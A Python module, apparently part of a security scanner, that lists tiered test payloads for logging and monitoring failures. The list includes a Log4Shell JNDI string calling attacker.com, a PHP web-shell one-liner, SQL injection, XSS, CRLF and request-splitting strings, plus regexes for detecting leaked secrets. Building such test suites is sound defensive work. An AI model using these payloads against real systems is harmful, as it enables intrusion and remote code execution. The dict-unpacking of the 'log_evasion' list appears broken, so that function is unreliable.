from colors import Colors

class LoggingPayloads:
    """Payloads for testing Security Logging and Monitoring Failures"""
    
    PAYLOADS = {
        "small": {
            "log_injection": {
                "basic": [
                    "admin' --",
                    "<script>alert(1)</script>",
                    "../../etc/passwd"
                ]
            },
            "sensitive_data": {
                "patterns": [
                    "password=",
                    "credit_card=",
                    "ssn="
                ]
            }
        },
        "medium": {
            "log_injection": {
                "advanced": [
                    "%0d%0aInjected-Log-Entry:1",
                    "<?php system($_GET['cmd']); ?>",
                    "${jndi:ldap://attacker.com/exploit}"
                ]
            },
            "sensitive_data": {
                "regex_patterns": [
                    r"api_key=[a-zA-Z0-9]{32}",
                    r"token=[a-zA-Z0-9]{64}",
                    r"pw=[^&\s]{8,}"
                ]
            },
            "log_forging": [
                "User admin performed sensitive action",
                "Password reset initiated for root",
                "Unauthorized access blocked"
            ]
        },
        "large": {
            "log_injection": {
                "comprehensive": [
                    # CRLF injection payloads
                    "%0d%0aX-Forwarded-For: 127.0.0.1",
                    "%0d%0aLocation: javascript:alert(1)",
                    
                    # XSS payloads
                    "\"><script>alert('XSS')</script>",
                    "javascript:eval('alert(1)')",
                    
                    # Log forging payloads
                    "2023-01-01 [AUTH] User admin logged in from 192.168.1.1",
                    "ERROR: Database connection failed - credentials invalid"
                ]
            },
            "sensitive_data": {
                "comprehensive_patterns": [
                    # Credit cards
                    r"\b4[0-9]{12}(?:[0-9]{3})?\b",  # Visa
                    r"\b5[1-5][0-9]{14}\b",          # MasterCard
                    
                    # API keys
                    r"\b[A-Za-z0-9]{32}\b",
                    r"\b[A-Za-z0-9]{40}\b",
                    
                    # JWTs
                    r"\beyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*\b"
                ]
            },
            "log_evasion": [
                # Obfuscated attacks
                "1' OR '1'='1' -- ",
                "1 UNION SELECT password FROM users--",
                "<IMG SRC=javascript:alert('XSS')>"
            ],
            "monitoring_bypass": [
                # Slowloris attack patterns
                "X-a: b\r\n",
                "X-a: b\r\nX-c: d\r\n",
                
                # Request splitting
                "GET / HTTP/1.1\r\nHost: example.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
            ]
        }
    }

    @classmethod
    def get_payloads(cls, size="medium"):
        """Get payloads based on size with validation"""
        size = size.lower()
        if size not in cls.PAYLOADS:
            size = "medium"
            
        payloads = cls.PAYLOADS[size]
        
        # Add common payloads that apply to all sizes
        payloads["common"] = {
            "log_levels": ["DEBUG", "INFO", "WARN", "ERROR", "FATAL"],
            "log_formats": [
                "[%timestamp%] %level% %message%",
                "%date% %time% [%thread%] %level% %logger% - %message%"
            ]
        }
        
        return payloads

    @classmethod
    def get_log_injection_payloads(cls, size="medium"):
        """Get specialized log injection payloads"""
        payloads = cls.get_payloads(size)
        return {
            **payloads.get("log_injection", {}),
            **payloads.get("log_evasion", {}),
            "techniques": [
                "CRLF Injection",
                "Log Forging", 
                "Log Truncation",
                "Log Injection via Headers"
            ]
        }

    @classmethod
    def get_sensitive_data_patterns(cls, size="medium"):
        """Get patterns for detecting sensitive data in logs"""
        payloads = cls.get_payloads(size)
        sensitive_patterns = []
        
        if "sensitive_data" in payloads:
            for pattern_group in payloads["sensitive_data"].values():
                if isinstance(pattern_group, list):
                    sensitive_patterns.extend(pattern_group)
        
        return {
            "patterns": sensitive_patterns,
            "common_formats": [
                "key=value",
                "JSON",
                "XML",
                "CSV"
            ]
        }

    @classmethod
    def get_monitoring_bypass_payloads(cls, size="large"):
        """Get payloads for testing monitoring bypass"""
        payloads = cls.get_payloads(size)
        return payloads.get("monitoring_bypass", [])